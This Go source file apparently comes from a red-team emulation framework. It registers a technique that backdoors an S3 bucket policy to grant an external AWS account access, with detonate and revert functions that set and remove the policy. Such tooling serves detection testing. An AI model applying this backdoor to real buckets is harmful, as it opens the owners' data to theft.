package aws

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

//go:embed malicious_policy.json
var backdooredPolicy string

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.s3-backdoor-bucket-policy",
		FriendlyName:       "Backdoor an S3 Bucket via its Bucket Policy",
		Platform:           stratus.AWS,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Exfiltrates data from an S3 bucket by backdooring its Bucket Policy to allow access from an external, fictitious AWS account.

Warm-up: 

- Create an S3 bucket.

Detonation: 

- Backdoor the S3 Bucket Policy by setting the following Bucket Policy:

<pre>
<code>
` + backdooredPolicy + `
</code>
</pre>
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
	bucketName := params["bucket_name"]
	policy := fmt.Sprintf(backdooredPolicy, bucketName, bucketName)

	log.Println("Backdooring bucket policy of " + bucketName)
	_, err := s3Client.PutBucketPolicy(context.Background(), &s3.PutBucketPolicyInput{
		Bucket: &bucketName,
		Policy: &policy,
	})

	return err
}

func revert(params map[string]string) error {
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
	bucketName := params["bucket_name"]

	log.Println("Removing malicious bucket policy on " + bucketName)
	_, err := s3Client.DeleteBucketPolicy(context.Background(), &s3.DeleteBucketPolicyInput{
		Bucket: &bucketName,
	})

	return err
}
